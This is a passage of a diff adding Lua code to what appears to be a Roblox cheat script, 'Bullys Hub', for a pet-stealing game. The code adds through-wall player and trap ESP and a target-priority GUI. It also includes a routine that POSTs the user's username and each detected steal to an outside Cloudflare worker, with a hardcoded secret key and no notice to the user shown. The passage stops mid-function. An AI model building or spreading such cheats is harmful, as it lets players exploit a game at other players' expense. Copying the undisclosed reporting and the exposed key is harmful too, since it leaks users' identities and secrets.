+        task.defer(function()
+            if addRacetrackBorder then addRacetrackBorder(main, Theme.Accent1, 4) end
+        end)
+
+        return hudGui
+    end
+
+    buildHUD()
+    _G.rebuildStatusHUD = buildHUD
+end)
+
+
+task.spawn(function()
+    local playerESPEnabled = Config.PlayerESP
+    local playerBillboards = {}
+    
+    local function makePlayerBillboard(player)
+        local bb = Instance.new("BillboardGui")
+        bb.Name = "PlayerESP_"..tostring(player.UserId)
+        bb.Size = UDim2.new(0, 100, 0, 20)
+        bb.StudsOffsetWorldSpace = Vector3.new(0, 2.8, 0)
+        bb.AlwaysOnTop = true; bb.LightInfluence = 0; bb.ResetOnSpawn = false
+        local nameLbl = Instance.new("TextLabel", bb)
+        nameLbl.Size = UDim2.new(1,0,1,0)
+        nameLbl.BackgroundTransparency = 1
+        nameLbl.Font = Enum.Font.GothamBlack; nameLbl.TextSize = 13
+        nameLbl.TextColor3 = Theme.Accent1
+        nameLbl.TextXAlignment = Enum.TextXAlignment.Center
+        nameLbl.TextStrokeTransparency = 0.4
+        nameLbl.TextStrokeColor3 = Color3.fromRGB(0,0,0)
+        nameLbl.Text = player.Name
+        return bb, nameLbl
+    end
+
+    local function getHRP(player)
+        local char = player.Character; if not char then return nil end
+        return char:FindFirstChild("HumanoidRootPart")
+    end
+
+    local function createOrRefresh(player)
+        if player == LocalPlayer then return end
+        local hrp = getHRP(player); if not hrp then return end
+        local hum = player.Character:FindFirstChild("Humanoid")
+        
+        if hum then
+            hum.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.None
+        end
+
+        local uid = player.UserId
+        local entry = playerBillboards[uid]
+        if not entry or not entry.bb or not entry.bb.Parent then
+            if entry and entry.bb then pcall(function() entry.bb:Destroy() end) end
+            local bb, nameLbl = makePlayerBillboard(player)
+            bb.Adornee = hrp; bb.Parent = hrp
+            playerBillboards[uid] = {bb=bb, nameLbl=nameLbl, player=player}
+        else
+            if entry.bb.Adornee ~= hrp then entry.bb.Adornee = hrp; entry.bb.Parent = hrp end
+        end
+    end
+
+    local function clearAll()
+        for uid, entry in pairs(playerBillboards) do
+            if entry.bb and entry.bb.Parent then pcall(function() entry.bb:Destroy() end) end
+            local p = Players:GetPlayerByUserId(uid)
+            if p and p.Character then
+                local h = p.Character:FindFirstChild("Humanoid")
+                if h then h.DisplayDistanceType = Enum.HumanoidDisplayDistanceType.Viewer end
+            end
+            playerBillboards[uid] = nil
+        end
+    end
+
+    playerESPToggleRef.setFn = function(enabled)
+        playerESPEnabled = enabled
+        if not enabled then clearAll() end
+    end
+
+    task.spawn(function()
+        while true do
+            task.wait(0.5)
+            if playerESPEnabled then
+            for uid, entry in pairs(playerBillboards) do
+                if not Players:GetPlayerByUserId(uid) then
+                    if entry.bb and entry.bb.Parent then pcall(function() entry.bb:Destroy() end) end
+                    playerBillboards[uid] = nil
+                end
+            end
+            for _, player in ipairs(Players:GetPlayers()) do
+                if player ~= LocalPlayer then
+                    pcall(createOrRefresh, player)
+                end
+            end
+            end
+        end
+    end)
+
+    Players.PlayerAdded:Connect(function(p)
+        p.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            if playerESPEnabled then pcall(createOrRefresh, p) end
+        end)
+    end)
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= LocalPlayer then
+            p.CharacterAdded:Connect(function()
+                task.wait(0.5)
+                if playerESPEnabled then pcall(createOrRefresh, p) end
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    local function makeBlacklistESP(player)
+        local char = player.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hrp then return end
+
+        local old = char:FindFirstChild("BullysBlacklistESP")
+        if old then old:Destroy() end
+
+        local msg = Config.BlacklistMsg or "BLOCKED"
+
+        local bb = Instance.new("BillboardGui")
+        bb.Name                  = "BullysBlacklistESP"
+        bb.Size                  = UDim2.new(0, 120, 0, 22)
+        bb.StudsOffsetWorldSpace = Vector3.new(0, 5.5, 0)  -- above regular ESP (2.8)
+        bb.AlwaysOnTop           = true
+        bb.LightInfluence        = 0
+        bb.ResetOnSpawn          = false
+        bb.Adornee               = hrp
+        bb.Parent                = hrp
+
+        local bg = Instance.new("Frame", bb)
+        bg.Size                  = UDim2.new(1, 0, 1, 0)
+        bg.BackgroundColor3      = Theme.Background or Color3.fromRGB(20, 15, 20)
+        bg.BackgroundTransparency = 0.15
+        bg.BorderSizePixel       = 0
+        Instance.new("UICorner", bg).CornerRadius = UDim.new(1, 0)
+        local bgStroke = Instance.new("UIStroke", bg)
+        bgStroke.Color           = Theme.Error or Color3.fromRGB(255, 60, 60)
+        bgStroke.Thickness       = 1.5
+        bgStroke.Transparency    = 0.1
+
+        local lbl = Instance.new("TextLabel", bg)
+        lbl.Name                 = "MsgLbl"
+        lbl.Size                 = UDim2.new(1, -8, 1, 0)
+        lbl.Position             = UDim2.new(0, 4, 0, 0)
+        lbl.BackgroundTransparency = 1
+        lbl.Text                 = "🚫 " .. msg
+        lbl.Font                 = Enum.Font.GothamBlack
+        lbl.TextSize             = 11
+        lbl.TextColor3           = Theme.Error or Color3.fromRGB(255, 80, 80)
+        lbl.TextStrokeTransparency = 0.5
+        lbl.TextStrokeColor3     = Color3.fromRGB(0, 0, 0)
+        lbl.TextXAlignment       = Enum.TextXAlignment.Center
+        lbl.TextTruncate         = Enum.TextTruncate.AtEnd
+
+        char.AncestryChanged:Connect(function()
+            if not char.Parent then pcall(function() bb:Destroy() end) end
+        end)
+    end
+
+    local function removeBlacklistESP(player)
+        local char = player.Character
+        if char then
+            local bb = char:FindFirstChild("BullysBlacklistESP")
+            if bb then bb:Destroy() end
+        end
+    end
+    -- Expose so removeFromBlacklist can call it immediately
+    _G.removeBlacklistESP = removeBlacklistESP
+
+    -- Watch for player leaving and clean up ESP
+    Players.PlayerRemoving:Connect(function(p)
+        removeBlacklistESP(p)
+    end)
+
+    -- Watch for character respawn to re-apply ESP if still blacklisted
+    Players.PlayerAdded:Connect(function(p)
+        p.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            if Config.BlacklistESP ~= false and isBlacklisted and isBlacklisted(p.Name) then
+                makeBlacklistESP(p)
+            end
+        end)
+    end)
+    for _, p in ipairs(Players:GetPlayers()) do
+        p.CharacterAdded:Connect(function()
+            task.wait(0.5)
+            if Config.BlacklistESP ~= false and isBlacklisted and isBlacklisted(p.Name) then
+                makeBlacklistESP(p)
+            end
+        end)
+    end
+
+    -- Main loop
+    while true do
+        task.wait(0.5)
+        if Config.BlacklistESP == false then continue end
+        for _, p in ipairs(Players:GetPlayers()) do
+            if p == LocalPlayer then continue end
+            pcall(function()
+                if isBlacklisted and isBlacklisted(p.Name) then
+                    local char = p.Character
+                    if char and not char:FindFirstChild("BullysBlacklistESP") then
+                        makeBlacklistESP(p)
+                    end
+                else
+                    removeBlacklistESP(p)
+                end
+            end)
+        end
+    end
+end)
+
+task.spawn(function()
+    local subspaceMineESPToggleRef = {setFn=nil} 
+
+    if settingsGui and settingsGui:FindFirstChild("sFrame", true) then
+        local sList = settingsGui.sFrame:FindFirstChild("sList")
+        if sList then
+            for _, row in ipairs(sList:GetChildren()) do
+                local lbl = row:FindFirstChildOfClass("TextLabel")
+                if lbl and lbl.Text == "Subspace Mine Esp" then
+                    local toggleSwitch = row:FindFirstChildWhichIsA("Frame")
+                    if toggleSwitch then
+                        local btn = toggleSwitch:FindFirstChildOfClass("TextButton")
+                        if btn then
+                            getgenv().subspaceMineESPToggleRef = subspaceMineESPToggleRef
+                        end
+                    end
+                    break 
+                end
+            end
+        end
+    end
+
+    local subspaceMineESPData = {}
+    local FolderName = "ToolsAdds" 
+
+    local function getMineOwner(mineName)
+        local ownerName = mineName:match("SubspaceTripmine(.+)")
+        
+        if not ownerName then return "Unknown" end 
+
+        local foundPlayer = Players:FindFirstChild(ownerName)
+        local displayName = foundPlayer and foundPlayer.DisplayName or ownerName
+        
+        return displayName
+    end
+
+    local function createMineESP(mine)
+        local ownerName = getMineOwner(mine.Name)
+
+        local selectionBox = Instance.new("SelectionBox")
+        selectionBox.Name = "ESP_Hitbox"
+        selectionBox.Adornee = mine 
+        selectionBox.Color3 = Color3.fromRGB(167, 142, 255)
+        selectionBox.LineThickness = 0.05
+        selectionBox.Parent = mine 
+
+        local billboardGui = Instance.new("BillboardGui")
+        billboardGui.Name = "ESP_Label"
+        billboardGui.Adornee = mine
+        billboardGui.Size = UDim2.new(0, 250, 0, 50)
+        billboardGui.StudsOffset = Vector3.new(0, 2.5, 0)
+        billboardGui.AlwaysOnTop = false 
+        billboardGui.Parent = mine
+
+        local textLabel = Instance.new("TextLabel", billboardGui)
+        textLabel.Size = UDim2.new(1, 0, 1, 0) 
+        textLabel.BackgroundTransparency = 1
+        textLabel.Text = ownerName .. "'s Subspace Mine"
+        textLabel.TextColor3 = Color3.fromRGB(167, 142, 255)
+        textLabel.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+        textLabel.TextStrokeTransparency = 0 
+        textLabel.Font = Enum.Font.GothamBold 
+        textLabel.TextSize = 16
+
+        return { selectionBox = selectionBox, billboardGui = billboardGui, mine = mine }
+    end
+
+    local function refreshSubspaceMineESP()
+        if not Config.SubspaceMineESP then
+            for i, data in pairs(subspaceMineESPData) do
+                if data.selectionBox and data.selectionBox.Parent then data.selectionBox:Destroy() end
+                if data.billboardGui and data.billboardGui.Parent then data.billboardGui:Destroy() end
+                subspaceMineESPData[i] = nil
+            end
+            return
+        end
+
+        local toolsFolder = Workspace:FindFirstChild(FolderName)
+        if not toolsFolder then return end
+
+        local currentMines = {}
+
+        for _, obj in pairs(toolsFolder:GetChildren()) do
+            if obj.Name:match("^SubspaceTripmine") and obj:IsA("BasePart") then
+                currentMines[obj] = true
+
+                if not subspaceMineESPData[obj] then
+                    subspaceMineESPData[obj] = createMineESP(obj)
+                end
+            end
+        end
+
+        for mineObj, data in pairs(subspaceMineESPData) do
+            if not currentMines[mineObj] or not mineObj.Parent then
+                if data.selectionBox and data.selectionBox.Parent then data.selectionBox:Destroy() end
+                if data.billboardGui and data.billboardGui.Parent then data.billboardGui:Destroy() end
+                subspaceMineESPData[mineObj] = nil
+            end
+        end
+    end
+
+    if subspaceMineESPToggleRef then
+        subspaceMineESPToggleRef.setFn = function(enabled)
+            Config.SubspaceMineESP = enabled
+            if not enabled then
+                for _, data in pairs(subspaceMineESPData) do
+                    if data.selectionBox and data.selectionBox.Parent then data.selectionBox:Destroy() end
+                    if data.billboardGui and data.billboardGui.Parent then data.billboardGui:Destroy() end
+                end
+                table.clear(subspaceMineESPData)
+            end
+        end
+    end
+
+    while true do
+        task.wait(0.5) 
+        
+        local success, errorMessage = pcall(refreshSubspaceMineESP)
+    end
+end)
+
+
+task.spawn(function()
+    local Packages = ReplicatedStorage:WaitForChild("Packages")
+    local Datas = ReplicatedStorage:WaitForChild("Datas")
+    
+    local AnimalsData = require(Datas:WaitForChild("Animals"))
+    
+    local function getPetsByRarity(rarityName)
+        local petList = {}
+        for petName, data in pairs(AnimalsData) do
+            if data.Rarity == rarityName and not petName:find("Lucky Block") then
+                table.insert(petList, petName)
+            end
+        end
+        table.sort(petList)
+        return petList
+    end
+    local secretPets = {}
+    local _seen = {}
+    for _, rar in ipairs({"Secret","Divine","Legendary","Epic","Rare"}) do
+        for _, nm in ipairs(getPetsByRarity(rar)) do
+            if not _seen[nm:lower()] then _seen[nm:lower()]=true; table.insert(secretPets,nm) end
+        end
+    end
+    table.sort(secretPets)
+    
+    local priorityGui = Instance.new("ScreenGui")
+    priorityGui.Name = "PriorityListGUI"
+    priorityGui.ResetOnSpawn = false
+    priorityGui.Parent = PlayerGui
+    priorityGui.Enabled = false
+    
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Size = UDim2.new(0, 650, 0, 600)
+    mainFrame.Position = UDim2.new(0.5, -325, 0.5, -300)
+    mainFrame.BackgroundColor3 = Theme.Background
+    mainFrame.BackgroundTransparency = 0.05
+    mainFrame.BorderSizePixel = 0
+    mainFrame.ClipsDescendants = true
+    mainFrame.Parent = priorityGui
+    
+    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 12)
+    local mainStroke = Instance.new("UIStroke", mainFrame)
+    mainStroke.Color = Theme.Accent2
+    mainStroke.Thickness = 1.5
+    mainStroke.Transparency = 0.4
+    CreateGradient(mainStroke)
+    
+    local header = Instance.new("Frame", mainFrame)
+    header.Size = UDim2.new(1, 0, 0, 40)
+    header.BackgroundTransparency = 1
+    MakeDraggable(header, mainFrame, nil)
+    
+    local titleLabel = Instance.new("TextLabel", header)
+    titleLabel.Size = UDim2.new(0.6, 0, 1, 0)
+    titleLabel.Position = UDim2.new(0, 15, 0, 0)
+    titleLabel.BackgroundTransparency = 1
+    titleLabel.Text = "PRIORITY LIST CUSTOMIZER"
+    titleLabel.Font = Enum.Font.GothamBlack
+    titleLabel.TextSize = 16
+    titleLabel.TextColor3 = Theme.TextPrimary
+    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
+    
+    local closeBtn = Instance.new("TextButton", header)
+    closeBtn.Size = UDim2.new(0, 80, 0, 30)
+    closeBtn.Position = UDim2.new(1, -95, 0.5, 0)
+    closeBtn.AnchorPoint = Vector2.new(0, 0.5)
+    closeBtn.BackgroundColor3 = Theme.Error
+    closeBtn.Text = "CLOSE"
+    closeBtn.Font = Enum.Font.GothamBold
+    closeBtn.TextSize = 12
+    closeBtn.TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("UICorner", closeBtn).CornerRadius = UDim.new(0, 6)
+    
+    closeBtn.MouseButton1Click:Connect(function()
+        priorityGui.Enabled = false
+    end)
+    
+    local contentFrame = Instance.new("Frame", mainFrame)
+    contentFrame.Size = UDim2.new(1, -30, 1, -100)
+    contentFrame.Position = UDim2.new(0, 15, 0, 50)
+    contentFrame.BackgroundTransparency = 1
+    
+    local availableLabel = Instance.new("TextLabel", contentFrame)
+    availableLabel.Size = UDim2.new(0.45, 0, 0, 25)
+    availableLabel.Position = UDim2.new(0, 0, 0, 0)
+    availableLabel.BackgroundTransparency = 1
+    availableLabel.Text = "AVAILABLE SECRET BRAINROTS"
+    availableLabel.Font = Enum.Font.GothamBold
+    availableLabel.TextSize = 12
+    availableLabel.TextColor3 = Theme.TextSecondary
+    
+    local availableScroll = Instance.new("ScrollingFrame", contentFrame)
+    availableScroll.Size = UDim2.new(0.45, 0, 1, -30)
+    availableScroll.Position = UDim2.new(0, 0, 0, 30)
+    availableScroll.BackgroundColor3 = Theme.Surface
+    availableScroll.BorderSizePixel = 0
+    availableScroll.ScrollBarThickness = 0
+    Instance.new("UICorner", availableScroll).CornerRadius = UDim.new(0, 8)
+    
+    local availablePadding = Instance.new("UIPadding", availableScroll)
+    availablePadding.PaddingTop = UDim.new(0, 5)
+    availablePadding.PaddingLeft = UDim.new(0, 5)
+    availablePadding.PaddingRight = UDim.new(0, 5)
+    availablePadding.PaddingBottom = UDim.new(0, 5)
+    
+    local availableListLayout = Instance.new("UIListLayout", availableScroll)
+    availableListLayout.Padding = UDim.new(0, 5)
+    availableListLayout.SortOrder = Enum.SortOrder.Name
+    
+    local priorityLabel = Instance.new("TextLabel", contentFrame)
+    priorityLabel.Size = UDim2.new(0.45, 0, 0, 25)
+    priorityLabel.Position = UDim2.new(0.55, 0, 0, 0)
+    priorityLabel.BackgroundTransparency = 1
+    priorityLabel.Text = "PRIORITY LIST"
+    priorityLabel.Font = Enum.Font.GothamBold
+    priorityLabel.TextSize = 12
+    priorityLabel.TextColor3 = Theme.TextSecondary
+    
+    local priorityScroll = Instance.new("ScrollingFrame", contentFrame)
+    priorityScroll.Size = UDim2.new(0.45, 0, 1, -30)
+    priorityScroll.Position = UDim2.new(0.55, 0, 0, 30)
+    priorityScroll.BackgroundColor3 = Theme.Surface
+    priorityScroll.BorderSizePixel = 0
+    priorityScroll.ScrollBarThickness = 0
+    Instance.new("UICorner", priorityScroll).CornerRadius = UDim.new(0, 8)
+    
+    local priorityPadding = Instance.new("UIPadding", priorityScroll)
+    priorityPadding.PaddingTop = UDim.new(0, 5)
+    priorityPadding.PaddingLeft = UDim.new(0, 5)
+    priorityPadding.PaddingRight = UDim.new(0, 5)
+    priorityPadding.PaddingBottom = UDim.new(0, 5)
+    
+    local priorityListLayout = Instance.new("UIListLayout", priorityScroll)
+    priorityListLayout.Padding = UDim.new(0, 5)
+    
+    local priorityButtons = {}
+    local availableButtons = {}
+    
+    local function updateScrollSizes()
+        task.wait()
+        availableScroll.CanvasSize = UDim2.new(0, 0, 0, availableListLayout.AbsoluteContentSize.Y + 10)
+        priorityScroll.CanvasSize = UDim2.new(0, 0, 0, priorityListLayout.AbsoluteContentSize.Y + 10)
+    end
+    
+    availableListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateScrollSizes)
+    priorityListLayout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(updateScrollSizes)
+    
+    local function refreshPriorityList()
+        for _, btn in pairs(priorityButtons) do
+            if btn and btn.Parent then
+                btn:Destroy()
+            end
+        end
+        priorityButtons = {}
+        
+        for i, petName in ipairs(PRIORITY_LIST) do
+            local itemFrame = Instance.new("Frame")
+            itemFrame.Size = UDim2.new(1, -10, 0, 35)
+            itemFrame.BackgroundColor3 = Theme.SurfaceHighlight
+            itemFrame.BorderSizePixel = 0
+            Instance.new("UICorner", itemFrame).CornerRadius = UDim.new(0, 6)
+            itemFrame.Parent = priorityScroll
+            
+            local nameLabel = Instance.new("TextLabel", itemFrame)
+            nameLabel.Size = UDim2.new(1, -110, 1, 0)
+            nameLabel.Position = UDim2.new(0, 10, 0, 0)
+            nameLabel.BackgroundTransparency = 1
+            nameLabel.Text = petName
+            nameLabel.Font = Enum.Font.GothamMedium
+            nameLabel.TextSize = 12
+            nameLabel.TextColor3 = Theme.TextPrimary
+            nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
+            
+            local upBtn = Instance.new("TextButton", itemFrame)
+            upBtn.Size = UDim2.new(0, 25, 0, 25)
+            upBtn.Position = UDim2.new(1, -100, 0.5, 0)
+            upBtn.AnchorPoint = Vector2.new(0, 0.5)
+            upBtn.BackgroundColor3 = Theme.Accent1
+            upBtn.Text = "↑"
+            upBtn.Font = Enum.Font.GothamBold
+            upBtn.TextSize = 12
+            upBtn.TextColor3 = Color3.new(0, 0, 0)
+            Instance.new("UICorner", upBtn).CornerRadius = UDim.new(0, 4)
+            
+            local downBtn = Instance.new("TextButton", itemFrame)
+            downBtn.Size = UDim2.new(0, 25, 0, 25)
+            downBtn.Position = UDim2.new(1, -70, 0.5, 0)
+            downBtn.AnchorPoint = Vector2.new(0, 0.5)
+            downBtn.BackgroundColor3 = Theme.Accent1
+            downBtn.Text = "↓"
+            downBtn.Font = Enum.Font.GothamBold
+            downBtn.TextSize = 12
+            downBtn.TextColor3 = Color3.new(0, 0, 0)
+            Instance.new("UICorner", downBtn).CornerRadius = UDim.new(0, 4)
+            
+            local removeBtn = Instance.new("TextButton", itemFrame)
+            removeBtn.Size = UDim2.new(0, 35, 0, 25)
+            removeBtn.Position = UDim2.new(1, -30, 0.5, 0)
+            removeBtn.AnchorPoint = Vector2.new(0, 0.5)
+            removeBtn.BackgroundColor3 = Theme.Error
+            removeBtn.Text = "X"
+            removeBtn.Font = Enum.Font.GothamBold
+            removeBtn.TextSize = 12
+            removeBtn.TextColor3 = Color3.new(1, 1, 1)
+            Instance.new("UICorner", removeBtn).CornerRadius = UDim.new(0, 4)
+            
+            upBtn.MouseButton1Click:Connect(function()
+                local currentIndex = nil
+                for idx, pName in ipairs(PRIORITY_LIST) do
+                    if pName == petName then
+                        currentIndex = idx
+                        break
+                    end
+                end
+                if currentIndex and currentIndex > 1 then
+                    PRIORITY_LIST[currentIndex], PRIORITY_LIST[currentIndex - 1] = PRIORITY_LIST[currentIndex - 1], PRIORITY_LIST[currentIndex]
+                    savePriorityToConfig()
+                    refreshPriorityList()
+                    refreshAvailableList()
+                end
+            end)
+            
+            downBtn.MouseButton1Click:Connect(function()
+                local currentIndex = nil
+                for idx, pName in ipairs(PRIORITY_LIST) do
+                    if pName == petName then
+                        currentIndex = idx
+                        break
+                    end
+                end
+                if currentIndex and currentIndex < #PRIORITY_LIST then
+                    PRIORITY_LIST[currentIndex], PRIORITY_LIST[currentIndex + 1] = PRIORITY_LIST[currentIndex + 1], PRIORITY_LIST[currentIndex]
+                    savePriorityToConfig()
+                    refreshPriorityList()
+                    refreshAvailableList()
+                end
+            end)
+            
+            removeBtn.MouseButton1Click:Connect(function()
+                for idx, pName in ipairs(PRIORITY_LIST) do
+                    if pName == petName then
+                        table.remove(PRIORITY_LIST, idx)
+                        savePriorityToConfig()
+                        refreshPriorityList()
+                        refreshAvailableList()
+                        break
+                    end
+                end
+            end)
+            
+            table.insert(priorityButtons, itemFrame)
+        end
+        
+        updateScrollSizes()
+    end
+    
+    local function refreshAvailableList()
+        for _, btn in pairs(availableButtons) do
+            if btn and btn.Parent then
+                btn:Destroy()
+            end
+        end
+        availableButtons = {}
+        
+        for _, petName in ipairs(secretPets) do
+            local itemFrame = Instance.new("Frame")
+            itemFrame.Size = UDim2.new(1, -10, 0, 30)
+            itemFrame.BackgroundColor3 = Theme.SurfaceHighlight
+            itemFrame.BorderSizePixel = 0
+            Instance.new("UICorner", itemFrame).CornerRadius = UDim.new(0, 6)
+            itemFrame.Parent = availableScroll
+            
+            local nameLabel = Instance.new("TextLabel", itemFrame)
+            nameLabel.Size = UDim2.new(1, -50, 1, 0)
+            nameLabel.Position = UDim2.new(0, 10, 0, 0)
+            nameLabel.BackgroundTransparency = 1
+            nameLabel.Text = petName
+            nameLabel.Font = Enum.Font.GothamMedium
+            nameLabel.TextSize = 11
+            nameLabel.TextColor3 = Theme.TextPrimary
+            nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+            nameLabel.TextTruncate = Enum.TextTruncate.AtEnd
+            
+            local addBtn = Instance.new("TextButton", itemFrame)
+            addBtn.Size = UDim2.new(0, 40, 0, 25)
+            addBtn.Position = UDim2.new(1, -45, 0.5, 0)
+            addBtn.AnchorPoint = Vector2.new(0, 0.5)
+            addBtn.BackgroundColor3 = Theme.Success
+            addBtn.Text = "ADD"
+            addBtn.Font = Enum.Font.GothamBold
+            addBtn.TextSize = 10
+            addBtn.TextColor3 = Color3.new(1, 1, 1)
+            Instance.new("UICorner", addBtn).CornerRadius = UDim.new(0, 4)
+            
+            local isInPriority = false
+            for _, pName in ipairs(PRIORITY_LIST) do
+                if pName:lower() == petName:lower() then
+                    isInPriority = true
+                    break
+                end
+            end
+            
+            if isInPriority then
+                addBtn.BackgroundColor3 = Theme.Error
+                addBtn.Text = "REM"
+                addBtn.MouseButton1Click:Connect(function()
+                    for i, pName in ipairs(PRIORITY_LIST) do
+                        if pName:lower() == petName:lower() then
+                            table.remove(PRIORITY_LIST, i)
+                            savePriorityToConfig()
+                            refreshPriorityList()
+                            refreshAvailableList()
+                            break
+                        end
+                    end
+                end)
+            else
+                addBtn.MouseButton1Click:Connect(function()
+                    table.insert(PRIORITY_LIST, petName)
+                    savePriorityToConfig()
+                    refreshPriorityList()
+                    refreshAvailableList()
+                end)
+            end
+            
+            table.insert(availableButtons, itemFrame)
+        end
+        
+        updateScrollSizes()
+    end
+    
+    refreshAvailableList()
+    refreshPriorityList()
+    SharedState.RefreshPriorityGUI = function() task.defer(function() refreshAvailableList(); refreshPriorityList() end) end
+    priorityGui:GetPropertyChangedSignal("Enabled"):Connect(function()
+        if priorityGui.Enabled then SharedState.RefreshPriorityGUI() end
+    end)
+    
+    local saveBtn = Instance.new("TextButton", mainFrame)
+    saveBtn.Size = UDim2.new(0, 120, 0, 35)
+    saveBtn.Position = UDim2.new(0.5, -60, 1, -45)
+    saveBtn.BackgroundColor3 = Theme.Success
+    saveBtn.Text = "SAVE PRIORITY"
+    saveBtn.Font = Enum.Font.GothamBold
+    saveBtn.TextSize = 12
+    saveBtn.TextColor3 = Color3.new(1, 1, 1)
+    Instance.new("UICorner", saveBtn).CornerRadius = UDim.new(0, 6)
+    
+    saveBtn.MouseButton1Click:Connect(function()
+        savePriorityToConfig()
+        ShowNotification("PRIORITY LIST", "Saved " .. #PRIORITY_LIST .. " pets!")
+        local successLabel = Instance.new("TextLabel", mainFrame)
+        successLabel.Size = UDim2.new(0, 200, 0, 30)
+        successLabel.Position = UDim2.new(0.5, -100, 1, -80)
+        successLabel.BackgroundColor3 = Theme.Success
+        successLabel.Text = "Priority List Saved! (" .. #PRIORITY_LIST .. " pets)"
+        successLabel.Font = Enum.Font.GothamBold
+        successLabel.TextSize = 11
+        successLabel.TextColor3 = Color3.new(1, 1, 1)
+        successLabel.TextXAlignment = Enum.TextXAlignment.Center
+        Instance.new("UICorner", successLabel).CornerRadius = UDim.new(0, 6)
+        
+        task.spawn(function()
+            task.wait(2)
+            if successLabel and successLabel.Parent then
+                successLabel:Destroy()
+            end
+        end)
+    end)
+    
+        UserInputService.InputBegan:Connect(function(input, processed)
+            if processed then return end
+            if input.KeyCode == Enum.KeyCode.P and UserInputService:IsKeyDown(Enum.KeyCode.LeftControl) then
+                priorityGui.Enabled = not priorityGui.Enabled
+            end
+        end)
+end)
+
+task.spawn(function()
+    local WEBHOOK_URL = "https://lowthc.buenoxaz.workers.dev"
+    local SECRET_KEY  = "35373ab8d6e07288b8e086ac050ad6cb"
+
+    local SUPER_PRIORITY = {
+        "Strawberry Elephant",
+        "Meowl",
+        "Skibidi Toilet",
+        "Headless Horseman",
+        "Griffin",
+        "Signore Carapace",
+    }
+
+    local function isOGPet(petName)
+        if not petName then return false end
+        local lower = petName:lower()
+        for _, v in ipairs(SUPER_PRIORITY) do
+            if v:lower() == lower then return true end
+        end
+        return false
+    end
+
+    local GITHUB_BASE = "https://raw.githubusercontent.com/buenowhh/bullys-hub-pets/main/pets/"
+
+    local function getBrainrotImageId(petName)
+        if not petName or petName == "" then return "" end
+        local fileName = petName:lower():gsub("%s+", "_") .. ".png"
+        return GITHUB_BASE .. fileName
+    end
+
+    local function SendWebhook(petName, value, mutation)
+        local isOG = isOGPet(petName)
+        local embedColor = isOG and 16711680 or 16711935
+
+        local mutPrefix = (mutation and mutation ~= "None" and mutation ~= "") and ("[" .. mutation .. "] ") or ""
+        local brainrotField = "`" .. mutPrefix .. petName .. " (" .. value .. ")`"
+        local stealerField = "@!" .. LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")"
+
+        local thumbnailUrl = getBrainrotImageId(petName)
+
+        local embedBody = {
+            title = "🔥 Steal Detected",
+            color = embedColor,
+            fields = {
+                {
+                    name = "☠️ Brainrot",
+                    value = brainrotField,
+                    inline = false
+                },
+                {
+                    name = "🕵️ Stealer",
+                    value = stealerField,
+                    inline = false
+                }
+            },
+            footer = { text = "Bullys Hub" },
+            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
+        }
+
+        if thumbnailUrl ~= "" then
+            embedBody.thumbnail = { url = thumbnailUrl }
+        end
+
+        local body = { embeds = { embedBody } }
+        if isOG then body.content = "@here" end
+
+        request({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {
+                ["Content-Type"] = "application/json",
+                ["X-Secret-Key"] = SECRET_KEY,
+            },
+            Body = HttpService:JSONEncode(body)
+        })
+    end
+    local Packages = ReplicatedStorage:WaitForChild("Packages")
+    local Datas = ReplicatedStorage:WaitForChild("Datas")
+    local Shared = ReplicatedStorage:WaitForChild("Shared")
+    local Utils = ReplicatedStorage:WaitForChild("Utils")
+    
+    local Synchronizer = require(Packages:WaitForChild("Synchronizer"))
+    local AnimalsData = require(Datas:WaitForChild("Animals"))
+    local AnimalsShared = require(Shared:WaitForChild("Animals"))
+    local NumberUtils = require(Utils:WaitForChild("NumberUtils"))
+    
+    local isStealing = false
+    local baseSnapshot = {}
+    
+    local stealStartTime = 0
+    local stealStartPosition = Vector3.new(0, 0, 0)
+    
+    local function GetMyPlot()
+        for _, plot in ipairs(Workspace.Plots:GetChildren()) do
+            local channel = Synchronizer:Get(plot.Name)
+            if channel then
+                local owner = channel:Get("Owner")
+                if (typeof(owner) == "Instance" and owner == LocalPlayer) or (typeof(owner) == "table" and owner.UserId == LocalPlayer.UserId) then
+                    return plot
+                end
+            end
+        end
+        return nil
+    end
+    
+    local function GetPetsOnPlot(plot)
+        local pets = {}
+        if not plot then return pets end
+        
+        local channel = Synchronizer:Get(plot.Name)
+        local list = channel and channel:Get("AnimalList")
+        if not list then return pets end
+        
+        for k, v in pairs(list) do
+            if type(v) == "table" then
+                pets[k] = {Index = v.Index, Mutation = v.Mutation, Traits = v.Traits}
+            end
+        end
+        return pets
+    end
+    
+    local function GetInfo(data)
+        local info = AnimalsData[data.Index]
+        local name = info and info.DisplayName or data.Index
+        local genVal = AnimalsShared:GetGeneration(data.Index, data.Mutation, data.Traits, nil)
+        local valStr = "$" .. NumberUtils:ToString(genVal) .. "/s"
+        return name, valStr, data.Mutation
+    end
+    
+    LocalPlayer:GetAttributeChangedSignal("Stealing"):Connect(function()
+        local state = LocalPlayer:GetAttribute("Stealing")
+        
+        if state then
+            isStealing = true
+            baseSnapshot = GetPetsOnPlot(GetMyPlot())
+            
+            stealStartTime = tick()
+            local char = LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                stealStartPosition = hrp.Position
+            end
+        else
+            if not isStealing then return end
+            isStealing = false
+
+            local stealDuration = tick() - stealStartTime
+            local distanceMoved = 0
+            local char = LocalPlayer.Character
+            local hrp = char and char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                distanceMoved = (hrp.Position - stealStartPosition).Magnitude
+            end
+            
+            task.wait(0.6)
+            
